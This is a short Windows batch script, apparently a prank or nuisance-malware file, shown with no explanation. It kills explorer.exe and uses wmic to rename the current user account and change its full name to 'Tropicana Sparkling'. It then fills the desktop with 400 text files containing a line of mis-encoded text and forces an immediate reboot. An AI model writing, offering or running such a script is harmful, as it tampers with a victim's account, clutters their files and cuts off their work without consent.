@echo off
taskkill /f /im explorer.exe
wmic useraccount where name='%username%' set FullName='Tropicana Sparkling'
wmic useraccount where name='%username%' rename 'Tropicana'
SET /a cr=0

:1
echo ��� ������ Ʈ����ī�� >> "%userprofile%\Desktop\sagwa%cr%.txt"
SET /a cr=%cr%+1
if not %cr%==400 goto 1

shutdown /r /f /t 0